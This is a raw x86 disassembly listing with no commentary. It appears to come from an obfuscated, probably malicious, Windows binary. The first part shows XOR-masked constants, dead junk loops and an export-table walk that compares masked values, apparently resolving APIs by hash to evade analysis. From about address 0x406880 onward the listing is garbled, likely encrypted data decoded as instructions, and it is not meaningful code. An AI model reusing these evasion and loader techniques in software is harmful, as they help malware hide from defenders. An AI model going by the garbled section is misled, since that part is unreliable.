  406171:	mov    DWORD PTR [ebp-0x10],eax
  406174:	jmp    0x403c34
  406179:	mov    ebx,DWORD PTR [ebp-0x3c]
  40617c:	mov    eax,DWORD PTR [ebp+0xc]
  40617f:	xor    eax,esi
  406181:	lea    ecx,[ecx+eax*1+0x3272f5]
  406188:	lea    eax,[ecx-0x3272f5]
  40618e:	xor    eax,esi
  406190:	cmp    eax,0xf89c95a5
  406195:	jne    0x401883
  40619b:	dec    DWORD PTR [ebp-0x34]
  40619e:	jne    0x401877
  4061a4:	mov    eax,DWORD PTR [ebp+0x8]
  4061a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4061aa:	mov    edx,DWORD PTR [ebp+0x8]
  4061ad:	xor    ecx,esi
  4061af:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f5]
  4061b6:	xor    eax,esi
  4061b8:	mov    al,BYTE PTR [eax+ebx*1+0x3272f5]
  4061bf:	xor    edx,esi
  4061c1:	mov    BYTE PTR [edx+ebx*1+0x3272f5],cl
  4061c8:	mov    ecx,DWORD PTR [ebp+0xc]
  4061cb:	xor    ecx,esi
  4061cd:	mov    BYTE PTR [ecx+ebx*1+0x3272f5],al
  4061d4:	mov    eax,DWORD PTR [ebp+0xc]
  4061d7:	xor    eax,esi
  4061d9:	add    eax,edi
  4061db:	pop    edi
  4061dc:	pop    esi
  4061dd:	pop    ebx
  4061de:	leave  
  4061df:	ret    0x8
  4061e2:	sbb    DWORD PTR ds:0x42b226,0x2deb
  4061ec:	xor    eax,eax
  4061ee:	sbb    DWORD PTR ds:0x42b1ce,0x42b18a
  4061f8:	inc    eax
  4061f9:	ret    
  4061fa:	push   ebp
  4061fb:	mov    ebp,esp
  4061fd:	sub    esp,0x38
  406200:	and    DWORD PTR ds:0x42b22a,0x0
  40620a:	mov    eax,ds:0x42b22a
  40620f:	inc    eax
  406210:	mov    ds:0x42b22a,eax
  406215:	cmp    DWORD PTR ds:0x42b22a,0x14
  40621c:	jbe    0x40624e
  406222:	jmp    0x406241
  406227:	push   0x42b216
  40622c:	push   0x1051
  406231:	push   0x42a251
  406236:	push   0x42a000
  40623b:	call   DWORD PTR ds:0x42b31e
  406241:	cmp    DWORD PTR ds:0x42b22a,0x12
  406248:	jb     0x40620a
  40624e:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  406255:	push   ebx
  406256:	mov    DWORD PTR [ebp-0xc],0xf89c85a2
  40625d:	mov    eax,DWORD PTR [ebp-0x4]
  406260:	push   esi
  406261:	and    DWORD PTR ds:0x42b22a,0x0
  40626b:	mov    esi,DWORD PTR ds:0x42b22a
  406271:	inc    esi
  406272:	mov    DWORD PTR ds:0x42b22a,esi
  406278:	cmp    DWORD PTR ds:0x42b22a,0x26
  40627f:	jbe    0x4062a0
  406285:	jmp    0x406293
  40628a:	push   DWORD PTR [ebp-0x1c]
  40628d:	call   DWORD PTR ds:0x42b322
  406293:	cmp    DWORD PTR ds:0x42b22a,0x16
  40629a:	jb     0x40626b
  4062a0:	mov    esi,0x75108ae
  4062a5:	or     DWORD PTR ds:0x42b1aa,0x42b19e
  4062af:	xor    eax,esi
  4062b1:	sub    DWORD PTR ds:0x42b1da,0x3dfa
  4062bb:	push   edi
  4062bc:	add    DWORD PTR ds:0x42b1ea,0x4970
  4062c6:	mov    edi,0x3272f5
  4062cb:	and    DWORD PTR ds:0x42b1ea,0x42b1d6
  4062d5:	add    eax,edi
  4062d7:	mov    DWORD PTR [ebp-0x1c],eax
  4062da:	mov    eax,DWORD PTR [ebp+0x14]
  4062dd:	add    DWORD PTR ds:0x42b22a,0x5e0e
  4062e7:	test   eax,eax
  4062e9:	je     0x40635d
  4062ef:	mov    DWORD PTR ds:0x42b1b6,0x13
  4062f9:	cmp    DWORD PTR ds:0x42b1b6,0x0
  406300:	je     0x40634f
  406306:	cmp    DWORD PTR ds:0x42b1b6,0x3
  40630d:	jle    0x40634f
  406313:	jmp    0x406323
  406318:	push   0x8d96
  40631d:	call   DWORD PTR ds:0x42b326
  406323:	cmp    DWORD PTR ds:0x42b1b6,0x4
  40632a:	jne    0x40633d
  406330:	mov    ebx,DWORD PTR ds:0x42b1b6
  406336:	dec    ebx
  406337:	mov    DWORD PTR ds:0x42b1b6,ebx
  40633d:	mov    ebx,DWORD PTR ds:0x42b1b6
  406343:	dec    ebx
  406344:	mov    DWORD PTR ds:0x42b1b6,ebx
  40634a:	jmp    0x4062f9
  40634f:	mov    eax,DWORD PTR [ebp+0x14]
  406352:	sbb    DWORD PTR ds:0x42b1ba,edx
  406358:	mov    eax,DWORD PTR [eax]
  40635a:	mov    DWORD PTR [ebp-0x1c],eax
  40635d:	and    ebx,DWORD PTR ds:0x42b1fa
  406363:	mov    eax,DWORD PTR [ebp-0x4]
  406366:	xor    eax,esi
  406368:	mov    DWORD PTR ds:0x42b22a,0x1f
  406372:	cmp    DWORD PTR ds:0x42b22a,0x0
  406379:	je     0x4063c1
  40637f:	cmp    DWORD PTR ds:0x42b22a,0x2a
  406386:	jg     0x4063c1
  40638c:	jmp    0x4063af
  406391:	push   0x42a061
  406396:	push   0x44b1
  40639b:	push   DWORD PTR [ebp-0x1c]
  40639e:	push   DWORD PTR [ebp-0x18]
  4063a1:	push   DWORD PTR [ebp-0x1c]
  4063a4:	push   0x7663
  4063a9:	call   DWORD PTR ds:0x42b2ea
  4063af:	mov    ebx,DWORD PTR ds:0x42b22a
  4063b5:	dec    ebx
  4063b6:	mov    DWORD PTR ds:0x42b22a,ebx
  4063bc:	jmp    0x406372
  4063c1:	add    eax,edi
  4063c3:	mov    DWORD PTR [ebp-0x8],eax
  4063c6:	sub    eax,eax
  4063c8:	mov    eax,DWORD PTR [ebp-0xc]
  4063cb:	add    DWORD PTR ds:0x42b196,ecx
  4063d1:	xor    eax,esi
  4063d3:	adc    ebx,DWORD PTR ds:0x42b1aa
  4063d9:	add    eax,edi
  4063db:	add    ebx,DWORD PTR ds:0x42b186
  4063e1:	mov    DWORD PTR [ebp-0x24],eax
  4063e4:	mov    eax,DWORD PTR [ebp-0x4]
  4063e7:	add    ebx,DWORD PTR ds:0x42b1ba
  4063ed:	xor    eax,esi
  4063ef:	and    DWORD PTR ds:0x42b19e,0x0
  4063f9:	jmp    0x40640b
  4063fe:	mov    ebx,DWORD PTR ds:0x42b19e
  406404:	inc    ebx
  406405:	mov    DWORD PTR ds:0x42b19e,ebx
  40640b:	cmp    DWORD PTR ds:0x42b19e,0x1e
  406412:	jae    0x406444
  406418:	cmp    DWORD PTR ds:0x42b19e,0x27
  40641f:	ja     0x406444
  406425:	jmp    0x40643f
  40642a:	push   0x42a061
  40642f:	push   DWORD PTR [ebp-0x20]
  406432:	push   0x0
  406434:	push   0x6ce9
  406439:	call   DWORD PTR ds:0x42b2ee
  40643f:	jmp    0x4063fe
  406444:	add    eax,edi
  406446:	mov    DWORD PTR [ebp-0x30],eax
  406449:	movzx  ebx,BYTE PTR ds:0x42b22e
  406450:	add    ebx,DWORD PTR ds:0x42b1c6
  406456:	mov    DWORD PTR ds:0x42b22e,ebx
  40645c:	mov    ebx,DWORD PTR [ebp-0x4]
  40645f:	xor    ebx,esi
  406461:	mov    eax,ds:0x42b1da
  406466:	or     DWORD PTR ds:0x42b1ee,eax
  40646c:	add    ebx,edi
  40646e:	and    DWORD PTR ds:0x42b1b2,0x0
  406478:	mov    eax,ds:0x42b1b2
  40647d:	inc    eax
  40647e:	mov    ds:0x42b1b2,eax
  406483:	cmp    DWORD PTR ds:0x42b1b2,0x1f
  40648a:	jg     0x4064ab
  406490:	jmp    0x40649e
  406495:	push   DWORD PTR [ebp-0x1c]
  406498:	call   DWORD PTR ds:0x42b2f2
  40649e:	cmp    DWORD PTR ds:0x42b1b2,0x17
  4064a5:	jb     0x406478
  4064ab:	mov    eax,DWORD PTR [ebp-0x24]
  4064ae:	and    DWORD PTR ds:0x42b1e2,0x6649
  4064b8:	sub    eax,edi
  4064ba:	sub    DWORD PTR ds:0x42b22e,0x1376
  4064c4:	lea    ecx,[ebx-0x3272f5]
  4064ca:	xor    DWORD PTR ds:0x42b212,0x3b15
  4064d4:	xor    eax,esi
  4064d6:	adc    DWORD PTR ds:0x42b216,0x7bbc
  4064e0:	xor    ecx,esi
  4064e2:	cmp    ecx,eax
  4064e4:	je     0x40678a
  4064ea:	mov    eax,ds:0x42b18a
  4064ef:	sbb    eax,DWORD PTR ds:0x42b192
  4064f5:	mov    ds:0x42b18a,eax
  4064fa:	mov    eax,DWORD PTR [ebp-0x4]
  4064fd:	xor    eax,esi
  4064ff:	add    eax,edi
  406501:	mov    DWORD PTR ds:0x42b21e,0x72e1
  40650b:	cmp    ebx,eax
  40650d:	mov    DWORD PTR ds:0x42b202,0xd47
  406517:	jne    0x406767
  40651d:	xor    DWORD PTR ds:0x42b1f2,0x42b1b6
  406527:	push   DWORD PTR [ebp+0x8]
  40652a:	call   0x424022
  40652f:	xor    DWORD PTR ds:0x42b1b2,edx
  406535:	mov    DWORD PTR [ebp-0x14],eax
  406538:	mov    ecx,DWORD PTR ds:0x42b296
  40653e:	mov    ecx,DWORD PTR [ecx]
  406540:	sbb    DWORD PTR ds:0x42b1f6,ecx
  406546:	mov    eax,DWORD PTR [ebp-0x4]
  406549:	sbb    DWORD PTR ds:0x42b1d6,ecx
  40654f:	mov    ecx,DWORD PTR [ebp-0x14]
  406552:	xor    eax,esi
  406554:	add    eax,edi
  406556:	mov    DWORD PTR ds:0x42b226,0x75db
  406560:	cmp    ecx,eax
  406562:	je     0x4067f5
  406568:	push   DWORD PTR [ebp-0x14]
  40656b:	push   DWORD PTR [ebp+0x8]
  40656e:	mov    DWORD PTR ds:0x42b196,0x32ca
  406578:	call   0x424138
  40657d:	mov    DWORD PTR [ebp-0x14],eax
  406580:	adc    DWORD PTR ds:0x42b18a,ecx
  406586:	mov    eax,DWORD PTR [ebp-0x4]
  406589:	adc    DWORD PTR ds:0x42b186,ecx
  40658f:	mov    ecx,DWORD PTR [ebp-0x14]
  406592:	sub    DWORD PTR ds:0x42b1e6,0x42b196
  40659c:	xor    eax,esi
  40659e:	adc    DWORD PTR ds:0x42b212,0x42b1f6
  4065a8:	add    eax,edi
  4065aa:	cmp    ecx,eax
  4065ac:	mov    DWORD PTR ds:0x42b1da,0x7670
  4065b6:	je     0x4067f5
  4065bc:	xor    eax,eax
  4065be:	add    eax,DWORD PTR ds:0x42b19a
  4065c4:	and    eax,DWORD PTR ds:0x42b1be
  4065ca:	mov    ds:0x42b19a,eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x14]
  4065d2:	mov    eax,DWORD PTR [eax+0x18]
  4065d5:	and    DWORD PTR ds:0x42b1e2,0x0
  4065df:	jmp    0x4065f1
  4065e4:	mov    ecx,DWORD PTR ds:0x42b1e2
  4065ea:	inc    ecx
  4065eb:	mov    DWORD PTR ds:0x42b1e2,ecx
  4065f1:	cmp    DWORD PTR ds:0x42b1e2,0x13
  4065f8:	jae    0x40663a
  4065fe:	cmp    DWORD PTR ds:0x42b1e2,0x9
  406605:	jb     0x40663a
  40660b:	jmp    0x40661b
  406610:	push   0x42b206
  406615:	call   DWORD PTR ds:0x42b2f6
  40661b:	cmp    DWORD PTR ds:0x42b1e2,0x8
  406622:	jne    0x406635
  406628:	mov    ecx,DWORD PTR ds:0x42b1e2
  40662e:	inc    ecx
  40662f:	mov    DWORD PTR ds:0x42b1e2,ecx
  406635:	jmp    0x4065e4
  40663a:	mov    DWORD PTR [ebp-0x24],eax
  40663d:	mov    eax,DWORD PTR [ebp-0x14]
  406640:	mov    ecx,DWORD PTR ds:0x42b1c2
  406646:	adc    ecx,DWORD PTR ds:0x42b1b2
  40664c:	mov    DWORD PTR ds:0x42b1c2,ecx
  406652:	mov    ecx,DWORD PTR [ebp+0x8]
  406655:	or     DWORD PTR ds:0x42b1f6,0x7077
  40665f:	add    ecx,DWORD PTR [eax+0x20]
  406662:	and    eax,0x7368
  406667:	mov    DWORD PTR [ebp-0x2c],ecx
  40666a:	mov    eax,DWORD PTR [ebp-0x14]
  40666d:	and    DWORD PTR ds:0x42b21a,0x0
  406677:	jmp    0x40668b
  40667c:	xor    ecx,ecx
  40667e:	or     ecx,DWORD PTR ds:0x42b21a
  406684:	inc    ecx
  406685:	mov    DWORD PTR ds:0x42b21a,ecx
  40668b:	cmp    DWORD PTR ds:0x42b21a,0x1c
  406692:	jae    0x4066e3
  406698:	cmp    DWORD PTR ds:0x42b21a,0x5
  40669f:	jbe    0x4066e3
  4066a5:	jmp    0x4066c4
  4066aa:	push   0x42b1f6
  4066af:	push   0x42b18e
  4066b4:	push   0x52aa
  4066b9:	push   0x42a0fe
  4066be:	call   DWORD PTR ds:0x42b2fa
  4066c4:	cmp    DWORD PTR ds:0x42b21a,0x4
  4066cb:	jne    0x4066de
  4066d1:	mov    ecx,DWORD PTR ds:0x42b21a
  4066d7:	inc    ecx
  4066d8:	mov    DWORD PTR ds:0x42b21a,ecx
  4066de:	jmp    0x40667c
  4066e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4066e6:	add    ecx,DWORD PTR [eax+0x24]
  4066e9:	mov    DWORD PTR [ebp-0x34],ecx
  4066ec:	adc    DWORD PTR ds:0x42b212,0x34a6
  4066f6:	mov    eax,DWORD PTR [ebp-0x14]
  4066f9:	and    DWORD PTR ds:0x42b192,0x0
  406703:	mov    ecx,DWORD PTR ds:0x42b192
  406709:	inc    ecx
  40670a:	mov    DWORD PTR ds:0x42b192,ecx
  406710:	cmp    DWORD PTR ds:0x42b192,0x4
  406717:	jbe    0x406759
  40671d:	jmp    0x406732
  406722:	push   0x42b1b6
  406727:	push   0x42a2a1
  40672c:	call   DWORD PTR ds:0x42b2fe
  406732:	cmp    DWORD PTR ds:0x42b192,0x3
  406739:	jne    0x40674c
  40673f:	mov    ecx,DWORD PTR ds:0x42b192
  406745:	inc    ecx
  406746:	mov    DWORD PTR ds:0x42b192,ecx
  40674c:	cmp    DWORD PTR ds:0x42b192,0x13
  406753:	jb     0x406703
  406759:	mov    ecx,DWORD PTR [ebp+0x8]
  40675c:	add    ecx,DWORD PTR [eax+0x1c]
  40675f:	mov    DWORD PTR [ebp-0x14],ecx
  406762:	jmp    0x4067bd
  406767:	mov    eax,DWORD PTR [ebp-0x2c]
  40676a:	mov    ecx,DWORD PTR [ebp+0x8]
  40676d:	add    ecx,DWORD PTR [eax+ebx*4]
  406770:	mov    DWORD PTR [ebp-0x28],ecx
  406773:	mov    eax,DWORD PTR [ebp-0x4]
  406776:	mov    ecx,DWORD PTR [ebp-0x28]
  406779:	xor    eax,esi
  40677b:	add    eax,edi
  40677d:	cmp    ecx,eax
  40677f:	je     0x4067bd
  406785:	jmp    0x4067ae
  40678a:	mov    eax,DWORD PTR [ebp-0x4]
  40678d:	mov    ecx,DWORD PTR [ebp-0x8]
  406790:	xor    eax,esi
  406792:	add    eax,edi
  406794:	cmp    ecx,eax
  406796:	mov    eax,DWORD PTR [ebp-0x4]
  406799:	je     0x4067f8
  40679f:	mov    ecx,DWORD PTR [ebp-0x30]
  4067a2:	xor    eax,esi
  4067a4:	add    eax,edi
  4067a6:	cmp    ecx,eax
  4067a8:	je     0x406801
  4067ae:	lea    eax,[ebp-0x8]
  4067b1:	push   eax
  4067b2:	push   DWORD PTR [ebp-0x28]
  4067b5:	push   DWORD PTR [ebp+0xc]
  4067b8:	call   0x40f847
  4067bd:	mov    eax,DWORD PTR [ebp-0x4]
  4067c0:	mov    ecx,DWORD PTR [ebp-0x8]
  4067c3:	xor    eax,esi
  4067c5:	add    eax,edi
  4067c7:	cmp    ecx,eax
  4067c9:	je     0x4067e4
  4067cf:	mov    eax,DWORD PTR [ebp-0x34]
  4067d2:	movzx  eax,WORD PTR [eax+ebx*2]
  4067d6:	mov    ecx,DWORD PTR [ebp-0x14]
  4067d9:	mov    eax,DWORD PTR [ecx+eax*4]
  4067dc:	mov    DWORD PTR [ebp-0x38],eax
  4067df:	jmp    0x40678a
  4067e4:	mov    eax,DWORD PTR [ebp-0xc]
  4067e7:	xor    eax,esi
  4067e9:	lea    ebx,[ebx+eax*1+0x3272f5]
  4067f0:	jmp    0x40646e
  4067f5:	mov    eax,DWORD PTR [ebp-0x4]
  4067f8:	xor    eax,esi
  4067fa:	add    eax,edi
  4067fc:	jmp    0x40f768
  406801:	mov    eax,DWORD PTR [ebp-0x38]
  406804:	add    eax,DWORD PTR [ebp+0x8]
  406807:	mov    DWORD PTR [ebp-0x18],eax
  40680a:	mov    eax,DWORD PTR [ebp-0x1c]
  40680d:	test   eax,eax
  40680f:	je     0x40afcd
  406815:	mov    DWORD PTR [ebp-0x20],0x0
  40681c:	push   0x3
  40681e:	xor    edx,edx
  406820:	pop    edx
  406821:	add    edx,0x8
  406824:	push   edx
  406825:	pop    ecx
  406826:	push   0x6
  406828:	dec    ecx
  406829:	pop    ebx
  40682a:	dec    ebx
  40682b:	xchg   ebx,ecx
  40682d:	sub    ebx,ecx
  40682f:	xchg   ebx,ecx
  406831:	dec    ecx
  406832:	mov    eax,DWORD PTR [ebp-0x1c]
  406835:	imul   eax,ecx
  406838:	sub    esp,eax
  40683a:	mov    DWORD PTR [ebp-0x20],esp
  40683d:	mov    eax,DWORD PTR [ebp-0x4]
  406840:	xor    eax,esi
  406842:	add    eax,edi
  406844:	jmp    0x408c14
  406849:	mov    ecx,DWORD PTR [ebp-0xc]
  40684c:	mov    eax,DWORD PTR [ebp+0x8]
  40684f:	mov    edx,DWORD PTR [ebp+0x14]
  406852:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406856:	xor    ecx,esi
  406858:	add    ecx,edi
  40685a:	xor    edx,edx
  40685c:	div    ecx
  40685e:	mov    ecx,DWORD PTR [ebp-0x4]
  406861:	xor    ecx,esi
  406863:	lea    eax,[ecx+eax*1+0x3272f5]
  40686a:	mov    ecx,DWORD PTR [ebp+0x8]
  40686d:	mov    edx,DWORD PTR [ebp-0x20]
  406870:	mov    DWORD PTR [edx+ecx*4],eax
  406873:	mov    eax,DWORD PTR [ebp-0xc]
  406876:	mov    ecx,DWORD PTR [ebp+0x8]
  406879:	xor    eax,esi
  40687b:	jmp    0x408c0d
  406880:	mov    ebx,0x2cc0cea
  406885:	mov    bh,BYTE PTR [ebx-0x264bb77e]
  40688b:	pop    esi
  40688c:	inc    ebx
  40688d:	imul   ebp,DWORD PTR [ebp-0x7cc2ec55],0x835e0c83
  406897:	sbb    DWORD PTR [esi+0x276c6020],0xffffff9e
  40689e:	add    ah,BYTE PTR [edx+0x49e93583]
  4068a4:	pop    ss
  4068a5:	scas   eax,DWORD PTR es:[edi]
  4068a6:	popf   
  4068a7:	mov    ebp,0x765f4232
  4068ac:	pop    ebx
  4068ad:	dec    ebp
  4068ae:	xchg   ebp,eax
  4068af:	push   ss
  4068b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068b1:	push   ebp
  4068b2:	xlat   BYTE PTR ds:[ebx]
  4068b3:	mov    ah,0x2a
  4068b5:	cmc    
  4068b6:	sub    esp,ebx
  4068b8:	xchg   esp,eax
  4068b9:	fbstp  TBYTE PTR [esp+ebx*1+0x35]
  4068bd:	mov    eax,ds:0xb93dd0a2
  4068c2:	xchg   esp,eax
  4068c3:	das    
  4068c4:	add    eax,0x27a2355d
  4068c9:	jp     0x406939
  4068cb:	test   DWORD PTR [esi+0x76],edi
  4068ce:	shl    edi,0x50
  4068d1:	and    BYTE PTR [eax],cl
  4068d3:	loope  0x406928
  4068d5:	loopne 0x4068d0
  4068d7:	xor    al,0xca
  4068d9:	sbb    BYTE PTR [edx+eiz*4-0x6f],0x1
  4068de:	pop    ebp
  4068df:	stc    
  4068e0:	leave  
  4068e1:	jge    0x406917
  4068e3:	loopne 0x406964
  4068e5:	into   
  4068e6:	aas    
  4068e7:	loopne 0x406947
  4068e9:	xor    DWORD PTR [ecx-0x79817103],ebp
  4068ef:	xchg   esp,eax
  4068f0:	out    dx,al
  4068f1:	push   ebp
  4068f2:	dec    ebp
  4068f3:	mov    eax,ds:0xe13773e2
  4068f8:	jb     0x40688b
  4068fa:	adc    DWORD PTR [edx+0x67],edx
  4068fd:	cdq    
  4068fe:	xor    ax,0x603c
  406902:	in     eax,0x82
  406904:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406905:	iret   
  406906:	or     DWORD PTR [edi-0x75eb39a5],0xb707bc49
  406910:	lods   eax,DWORD PTR ds:[esi]
  406911:	pop    esi
  406912:	xchg   edi,eax
  406913:	out    0x48,eax
  406915:	cmp    ah,BYTE PTR [ebp+0x3e]
  406918:	lds    edx,FWORD PTR [ebp+0x8]
  40691b:	test   cl,bh
  40691d:	shl    BYTE PTR [eax],0x7e
  406920:	and    eax,0x8531dce7
  406925:	sub    DWORD PTR [ebp-0xe9dee4b],0xffffffee
  40692c:	adc    eax,0xc53f54f4
  406931:	jle    0x4068fd
  406933:	inc    edi
  406934:	adc    BYTE PTR [ecx-0x78bf0d96],ah
  40693a:	rcr    bh,0xa8
  40693d:	xchg   dl,cl
  40693f:	ins    BYTE PTR es:[edi],dx
  406940:	sbb    bh,BYTE PTR ds:0x6d210f42
  406946:	popa   
  406947:	add    al,0x61
  406949:	daa    
  40694a:	aaa    
  40694b:	jb     0x4069c4
  40694d:	js     0x4069bb
  40694f:	sub    BYTE PTR [ebp+0x4c],ch
  406952:	sbb    eax,0xe5ceb2a9
  406957:	xchg   edx,eax
  406958:	dec    esi
  406959:	push   0x47b0e351
  40695e:	xlat   BYTE PTR ds:[ebx]
  40695f:	pop    ecx
  406960:	push   ds
  406961:	das    
  406962:	test   BYTE PTR [ebp+0x543d08a0],bl
  406968:	loop   0x406996
  40696a:	push   esp
  40696b:	test   DWORD PTR [edi-0x37],esi
  40696e:	add    bx,sp
  406971:	enter  0x1d4,0xb8
  406975:	cmp    DWORD PTR [edi+0x346fd03c],ebx
  40697b:	lock pop eax
  40697d:	mov    edi,0x475b23cf
  406982:	(bad)  
  406983:	out    dx,al
  406984:	mov    ds:0x6e72df5f,al
  406989:	pop    esi
  40698a:	call   0xec6b:0x57152fb2
  406991:	(bad)  [edx-0x62cda283]
  406997:	mov    ds:0x51943555,al
  40699c:	mov    cl,0xc7
  40699e:	sub    al,0x9c
  4069a0:	lahf   
  4069a1:	adc    bh,BYTE PTR [edi]
  4069a3:	fdivr  DWORD PTR cs:[esi-0x9d269f9]
  4069aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069ab:	mov    esp,0x895b9e53
  4069b0:	push   edx
  4069b1:	xchg   al,bh
  4069b3:	dec    edx
  4069b4:	sub    dh,al
  4069b6:	and    edi,DWORD PTR [esi+ebp*4-0x3b]
  4069ba:	jno    0x406954
  4069bc:	ins    BYTE PTR es:[edi],dx
  4069bd:	imul   esi,DWORD PTR ss:[ecx+0x2964128c],0x56
  4069c5:	push   eax
  4069c6:	cli    
  4069c7:	or     edi,DWORD PTR [ebp+0x79684849]
  4069cd:	sub    edi,DWORD PTR ds:0xeeb6f032
  4069d3:	mov    cl,bh
  4069d5:	loop   0x406970
  4069d7:	inc    esi
  4069d8:	cwde   
  4069d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069da:	jo     0x406a35
  4069dc:	jns    0x4069b5
  4069de:	test   BYTE PTR [edi],bl
  4069e0:	ss ret 
  4069e2:	or     DWORD PTR [edx-0x43],edi
  4069e5:	mov    ebx,0x519a45ed
  4069ea:	out    dx,al
  4069eb:	loopne 0x40698d
  4069ed:	push   ss
  4069ee:	lahf   
  4069ef:	dec    edx
  4069f0:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4069f2:	jmp    0x7b88:0xab16722a
  4069f9:	or     BYTE PTR [edx+ecx*8],dh
  4069fc:	jo     0x4069d6
  4069fe:	js     0x406a4f
  406a00:	out    0xd8,al
  406a02:	pop    esi
  406a03:	mov    ds:0x896640f1,eax
  406a08:	rcl    DWORD PTR [ebx-0x7a0506bb],0xa7
  406a0f:	xchg   ebp,eax
  406a10:	ja     0x406a7c
  406a12:	and    cl,BYTE PTR [eax-0x2]
  406a15:	shl    DWORD PTR [edi+0x63c4b48],1
  406a1b:	xor    edx,0x9856e670
  406a21:	lods   al,BYTE PTR ds:[esi]
  406a22:	add    DWORD PTR [ebp+0xc],ebx
  406a25:	test   cl,ch
  406a27:	clc    
  406a28:	jbe    0x4069d2
  406a2a:	sti    
  406a2b:	jmp    0x4a5e:0x742020ec
  406a32:	push   0x7f94ee8
  406a37:	jo     0x406a81
  406a39:	add    bl,BYTE PTR [edx+0x70e062ea]
  406a3f:	mov    WORD PTR [edx-0x3],?
  406a42:	test   al,0x71
  406a44:	pushf  
  406a45:	js     0x406a78
  406a47:	repnz and DWORD PTR [esi+0x39],edx
  406a4b:	push   es
  406a4c:	push   ebx
  406a4d:	dec    esp
  406a4e:	cwde   
  406a4f:	(bad)  
  406a50:	mov    edx,0xaaa1f3d7
  406a55:	jmp    0x406a89
  406a57:	mov    ds:0xe2cf859a,eax
  406a5c:	push   ebp
  406a5d:	xchg   ebx,eax
  406a5e:	pop    edi
  406a5f:	in     al,dx
  406a60:	dec    esp
  406a61:	mov    DWORD PTR [ebx-0x17],ebx
  406a64:	mov    esp,0xe716a88c
  406a69:	leave  
  406a6a:	sbb    ecx,DWORD PTR [ecx-0x5d47e4d4]
  406a70:	mov    ebx,eax
  406a72:	jbe    0x406ac8
  406a74:	ret    
  406a75:	ins    BYTE PTR es:[edi],dx
  406a76:	add    ebp,eax
  406a78:	hlt    
  406a79:	push   esp
  406a7a:	imul   esi,DWORD PTR [edi+0x51],0x2993843b
  406a81:	inc    esi
  406a82:	out    0xe9,al
  406a84:	xor    DWORD PTR [edx+0xc789b5],0xca5a48af
  406a8e:	push   edx
  406a8f:	out    dx,eax
  406a90:	pop    esp
  406a91:	fmul   DWORD PTR [esp+eiz*2+0x0]
  406a95:	sub    dh,ah
  406a97:	and    bh,BYTE PTR fs:[edi+0x30]
  406a9b:	hlt    
  406a9c:	sbb    dl,BYTE PTR [edi-0x57b1a833]
  406aa2:	mov    WORD PTR [eax-0x4975fb3c],cs
  406aa8:	or     eax,0x5bdb74ba
  406aad:	iret   
  406aae:	adc    DWORD PTR [edi+0x60b1cf73],edi
  406ab4:	mov    ebx,0x3557f994
  406ab9:	call   0x3cba:0x6ad79be4
  406ac0:	imul   ebx,DWORD PTR [eax],0x1c8ab021
  406ac6:	mov    dl,BYTE PTR [eax]
  406ac8:	adc    DWORD PTR [esi],0x619c98ce
  406ace:	and    ebx,DWORD PTR [ebx-0x64]
  406ad1:	sti    
  406ad2:	retf   
  406ad3:	scas   eax,DWORD PTR es:[edi]
  406ad4:	inc    ecx
  406ad5:	nop
  406ad6:	mov    al,0xc1
  406ad8:	inc    ecx
  406ad9:	retf   
  406ada:	add    al,0xa8
  406adc:	lahf   
  406add:	cld    
  406ade:	(bad)  [eax+0x6e]
  406ae1:	lahf   
  406ae2:	sti    
  406ae3:	fnstcw WORD PTR [ebx]
  406ae5:	ins    BYTE PTR es:[di],dx
  406ae7:	ret    
  406ae8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ae9:	xor    eax,0x9f82e9ca
  406aee:	jg     0x406ac8
  406af0:	les    ebp,FWORD PTR [ebx+0x56]
  406af3:	pop    eax
  406af4:	adc    ebp,DWORD PTR [edx-0x7]
  406af7:	outs   dx,DWORD PTR ds:[esi]
  406af8:	jne    0x406ae6
  406afa:	mov    al,ds:0x288753f4
  406aff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b00:	out    dx,al
  406b01:	imul   edi,DWORD PTR [ebp-0x17],0x156667a1
  406b08:	xchg   esp,eax
  406b09:	push   ss
  406b0a:	xchg   edi,eax
  406b0b:	pop    ebx
  406b0c:	gs aam 0x8d
  406b0f:	aam    0x67
  406b11:	sti    
  406b12:	inc    edx
  406b13:	cdq    
  406b14:	in     al,0x5f
  406b16:	(bad)  
  406b17:	and    al,0x3b
  406b19:	cwde   
  406b1a:	dec    ecx
  406b1b:	mov    ?,WORD PTR [edx]
  406b1d:	cmp    dl,BYTE PTR [ecx+0x4f]
  406b20:	adc    sp,WORD PTR [edi+0x13491e6f]
  406b27:	call   0x204a51f2
  406b2c:	xchg   ecx,eax
  406b2d:	cmp    BYTE PTR ss:[edx-0x871c2cf],0x2f
  406b35:	lods   eax,DWORD PTR ds:[esi]
  406b36:	aad    0xbc
  406b38:	rcl    ah,cl
  406b3a:	lods   eax,DWORD PTR ds:[esi]
  406b3b:	mov    ds:0xd67abd4e,eax
  406b40:	push   ss
  406b41:	clc    
  406b42:	cmp    BYTE PTR ds:0x7a503aa2,dl
  406b48:	mov    bl,0x72
  406b4a:	(bad)
  406b4d:	retf   0xd4a
  406b50:	sub    al,0xf9
  406b52:	pop    es
  406b53:	or     al,0xeb
  406b55:	pop    es
  406b56:	sub    esp,DWORD PTR [ebx]
  406b58:	dec    esp
  406b59:	inc    eax
  406b5a:	add    BYTE PTR [eax-0x509677e6],ah
  406b60:	dec    edx
  406b61:	cmp    ecx,edi
  406b63:	out    0x3d,al
  406b65:	sub    edx,0xffffffae
  406b68:	daa    
  406b69:	hlt    
  406b6a:	fsub   st(7),st
  406b6c:	fcomp  DWORD PTR [esi+0x80c33f]
  406b72:	lods   al,BYTE PTR ds:[esi]
  406b73:	jbe    0x406b5a
  406b75:	jae    0x406bcd
  406b77:	pop    eax
  406b78:	dec    ebx
  406b79:	sub    DWORD PTR [ebp+0x359495fe],edi
  406b7f:	jo     0x406b14
  406b81:	dec    edi
  406b82:	inc    ebp
  406b83:	dec    ebx
  406b84:	fistp  DWORD PTR [edx+0x76]
  406b87:	addr16 cmc 
